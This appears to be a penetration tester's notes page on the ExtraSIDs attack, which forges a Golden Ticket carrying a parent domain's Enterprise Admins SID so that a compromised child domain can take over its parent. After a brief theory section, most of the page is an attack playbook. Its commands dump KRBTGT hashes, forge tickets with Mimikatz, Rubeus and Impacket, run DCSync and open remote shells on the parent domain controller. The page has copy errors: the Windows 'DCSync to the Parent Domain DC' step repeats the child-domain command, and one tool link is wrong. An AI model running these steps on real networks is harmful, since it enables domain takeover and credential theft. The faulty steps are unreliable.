---
Primary_category: "[[WINDOWS TRUSTS]]"
title: "EXTRASIDS"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS TRUSTS]]

#### *Theory*

This attack leverages the *[[WINDOWS TRUSTS#SID History|SID History]]* attribute of a domain user account or group

As stated in other sections, this attribute simplifies the migration of either a user account or group across domains or forests by adding the *SID* of the original object to the new object's *SIDHistory* attribute created in the destination domain or forest

It is intented to work properly in both domain internal trust, such as *Child → Parent* trust, and external forest trust

By default, *SID Filtering* is applied to the latter, so it is not possible to perform the *ExtraSIDs* attack when a trust is established with an object outside the given forest

However, that is not the case when we talk about a trust between two objects, such as domains, in the same forest. There, the *SID Filtering* security measure does not apply, so an operator could potentially take over one domain if the other has been compromised previously by abusing the *SIDHistory* attribute

That is, an operator could grab the *KRBTGT*'s *NT Hash* or *AES keys* of the compromised domain, along with other relevant information such as the *Domain SID* and *FQDN*, and perform a *Golden Ticket* attack by crafting a *Ticket Granting Ticket* for the current domain

As usual, the *SIDs* of certain privileged groups of the given domain are added to the *Privilege Attribute Certificate (PAC)* of the crafted *TGT*. Besides these *SIDs*, another one, related to a privileged group in the target domain, such as the *Enterprise Admins*  group, is also added

This implies that when a *kerberos client* authenticates itself with the *Golden Ticket* to request a *Service Ticket* and subsequently presents the latter in order to access a resource in a given server, if an *ACE* for the *Enterprise Admins* group exists on it, the system will grant the client access to the resource

---

#### *Abuse (Fast) - UNIX-like*

##### *Impacket's RaiseChild.py*

> ***[RaiseChild.py](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py)***

###### *Getting Credentials for a specific account*

> **`-targetRID`**

```bash
raiseChild.py -targetRID '<PARENT_DOMAIN_RID_ACCOUNT>' '<PARENT_DOMAIN_DC>' '<CHILD_DOMAIN_FQDN>/<CHILD_DOMAIN_USER>:<PASSWD>'
```

###### *Getting a Shell via SMB on the Target*

> **`-target-exec`**

```bash
raiseChild.py -target-exec '<PARENT_DOMAIN_DC>' '<CHILD_DOMAIN_FQDN>/<CHILD_DOMAIN_USER>:<PASSWD>'
```

---

#### *Abuse (Manual Way) - UNIX-like*

Let's suppose we are in an scenario where we have compromised a child domain, which has a bidirectional trust relationship with a parent domain in the same forest

Due to the lack of the *SID filtering* in this scenario, we can leverage the *SIDHistory* attribute to perform a *[[GOLDEN TICKETS|Golden Ticket]]* attack and craft a *TGT* for either an existing or non-existing user in the child domain

As we mentioned earlier, we will add to this ticket, aside from the privileged group's *SIDs* of the child domain, the *SID* of a privileged group in the parent domain, such as the *Enterprise Admins* group

Therefore, in order to perform this attack and take over the parent domain, leveraging the bidirectional trust and the lack of *SID Filtering*, we must glean the following pieces of information

→ The ***KRBTGT hash*** for the ***Child Domain***

→ The ***SID*** for the ***Child Domain***

→ The name of a ***existing user*** in the ***Child Domain (Or non-existing user)***

→ The ***FQDN*** of the ***Child Domain***

→ The ***SID*** of the ***Enterprise Admins Group*** of the ***Parent Domain***

##### *Extracting KRBTGT Credentials of the Child Domain*

###### *Impacket's Secretsdump.py*

> ***[Secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***

```bash
secretsdump.py -just-dc-user '<CHILD_DOMAIN>/krbtgt' '<CHILD_DOMAIN_FQDN>/<USER>:<PASSWD>@<DC>' # -just-dc-user e.g. → -just-dc-user 'lab.local/krbtgt'
```

##### *Gathering the Child Domain SID*

###### *Impacket's Lookupsid.py*

> ***[Lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)***

```bash
lookupsid.py '<DOMAIN>/<USER>:<PASSWD>@<CHILD_DOMAIN_DC>' 0
```

###### *Net RPC*

> ***[Net RPC](https://www.samba.org/samba/docs/current/man-html/net.8.html)***

```bash
net rpc info -U '<USER>%<PASSWD>' -S '<CHILD_DOMAIN_DC>'
```

###### *RPCClient*

> ***[RPCClient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)***

```bash
rpcclient --user '<USER>%<PASSWD>' --command 'lsaquery' '<CHILD_DOMAIN_DC>'
```

##### *Gathering the Enterprise Admin Group SID of the Parent Domain*

###### *Impacket's Lookupsid.py*

> ***[Lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)***

```bash
lookupsid.py '<CHILD_DOMAIN>/<CHILD_DOMAIN_USER>:<PASSWD>@<PARENT_DOMAIN_DC>' 0
```

We should already know the *Child Domain FQDN* from the *AD Trust* enumeration stage. Regarding to the domain user account to be chosen, as long as I know, it can be a non-existing one

Once we have gathered all the required data, we can craft locally a *Golden Ticket* using either the *KRBTGT's NT hash* or *AES keys*. First, we create a data structure, the *Privilege Attribute Certificate (PAC)*, containing all the information related to the kerberos principal, such as its *SID*, the *SID* of the group to which the account *"belongs"*, the *Enterprise Admins* group's *SID* of the parent domain and so on

Then, the *PAC*, along with other data, such as the *kerberos session key*, is encrypted-then-signed with the *KRBTGT* key

##### *Creating a Golden Ticket (ExtraSIDs)*

###### *Impacket's Ticketer.py*

> ***[Ticketer.py](https://github.com/fortra/impacket/blob/master/examples/getST.py)***

> ⚠️ ***Update → The user provided must be an existing domain user account***

```bash
ticketer.py -nthash '<CHILD_DOMAIN_KRBTGT_NT_HASH>' -dc-ip '<CHILD_DOMAIN_DC>' -domain '<CHILD_DOMAIN_FQDN>' -domain-sid '<CHILD_DOMAIN_SID>' -extra-sid '<PARENT_DOMAIN_PRIVILEGED_GROUP_SID>' '<CHILD_DOMAIN_EXISTING_USER>'
```

We can list the *PAC* information along with other data stored within the *Golden Ticket* as follows

###### *Impacket's describeTicket.py*

> ***[DescribeTicket.py](https://github.com/fortra/impacket/blob/master/examples/describeTicket.py)***

```bash
describeTicket.py --rc4 '<NT_HASH>' '<GOLDEN_TICKET>'
```

Next, we can perform a *[[PASS THE TICKET|Pass the Ticket (PtT)]]* using the generated *CCache* file, which contains both the *TGT* and its *session key*. With this, we inject the *kerberos* data in the current session for subsequent authentications and thus be able to carry out privileged actions such as *[[DCSYNC|DCSync]]* or establish a remote connection to the *DC* either via *SMB* or *WinRM*

##### *#1 - DCSync to the Parent Domain DC*

###### *Impacket's Secretsdump.py*

> ***[Secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***

```bash
export KRB5CCNAME=$( realpath <GOLDEN_TICKET> )
```

```bash
secretsdump.py -k -no-pass -just-dc-user '<PARENT_DOMAIN>\Administrator' '<CHILD_DOMAIN_FQDN>/<IMPERSONATED_USER>@<PARENT_DOMAIN_DC_FQDN>'
```

##### *#2 - Remote Connection to the Parent Domain DC via SMB*

###### *Impacket's WMIExec.py*

> ***[WMIExec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)***

```bash
export KRB5CCNAME=$( realpath <GOLDEN_TICKET> )
```

```bash
wmiexec.py -k -no-pass '<CHILD_DOMAIN_FQDN>/<IMPERSONATED_USER>@<PARENT_DOMAIN_DC_FQDN>'
```

##### *#3 - Remote Connection to the Parent Domain DC via WinRM*

###### *Evil-WinRM*

> ***[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)***

```bash
export KRB5CCNAME=$( realpath <GOLDEN_TICKET> )
```

```bash
evil-winrm --realm '<CHILD_DOMAIN_FQDN>' --ip '<PARENT_DOMAIN_DC_FQDN>'
```

---

#### *Abuse - Windows*

Taking into account the abuse scenario presented above and the pieces of information needed in order to perform the attack in question, proceed as follows to take over the entire parent domain


##### *Extracting KRBTGT Credentials of the Child Domain*

###### *Mimikatz*

> ***[Mimikatz](https://github.com/ParrotSec/mimikatz)***

> ***lsadump::dcsync***

```bash
lsadump::dcsync /user:<CHILD_DOMAIN>\krbtgt /domain:<CHILD_DOMAIN_FQDN> /dc:<CHILD_DOMAIN_DC_FQDN> # /user e.g. → /user:lab\krbtgt (domain:lab.local)
```

##### *Gathering the Child Domain SID*

###### *Powerview*

> ***[Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)***

> ***Get-DomainSID***

```powershell
Get-DomainSID
```

##### *Gathering the Enterprise Admin Group SID of the Parent Domain*

###### *Powerview*

> ***[Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)***

> ***Get-DomainGroup***

```powershell
Get-DomainGroup -Domain '<PARENT_DOMAIN_FQDN>' -Identity 'Enterprise Admins' | Select -ExpandProperty ObjectSID
```

##### *Creating a Golden Ticket (ExtraSIDs)*

###### *Mimikatz*

> ***[Mimikatz](https://github.com/ParrotSec/mimikatz)***

> ***Kerberos::golden***

```bash
kerberos::golden /user:<CHILD_DOMAIN_ACCOUNT> /domain:<CHILD_DOMAIN_FQDN> /sid:<CHILD_DOMAIN_SID> /krbtgt:<CHILD_DOMAIN_KRBTGT_KEY> /sids:<PARENT_DOMAIN_PRIVILEGED_GROUP_SID> /ptt
```

###### *Rubeus*

> ***[Rubeus](https://github.com/GhostPack/Rubeus)***

```bash
Rubeus.exe golden /user:<CHILD_DOMAIN_ACCOUNT> /domain:<CHILD_DOMAIN_FQDN> /sid:<CHILD_DOMAIN_SID> /rc4:<CHILD_DOMAIN_KRBTGT_NT_HASH> /sids:<PARENT_DOMAIN_PRIVILEGED_GROUP_SID> /ptt
```

##### *#1 - DCSync to the Parent Domain DC*

###### *Mimikatz*

> ***[Mimikatz](https://github.com/ParrotSec/mimikatz)***

> ***lsadump::dcsync***

```bash
lsadump::dcsync /user:<CHILD_DOMAIN>\krbtgt /domain:<CHILD_DOMAIN_FQDN> /dc:<CHILD_DOMAIN_DC_FQDN> # /user e.g. → /user:lab\krbtgt (domain:lab.local)
```

##### *#2 - Remote Connection to the Parent Domain DC via WinRM*

###### *Enter-PSSession*

> ***[Enter-PSSession](https://learn.microsoft.com/es-es/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.5)***

```powershell
Enter-PSSession -ComputerName '<PARENT_DOMAIN_DC_FQDN>'
```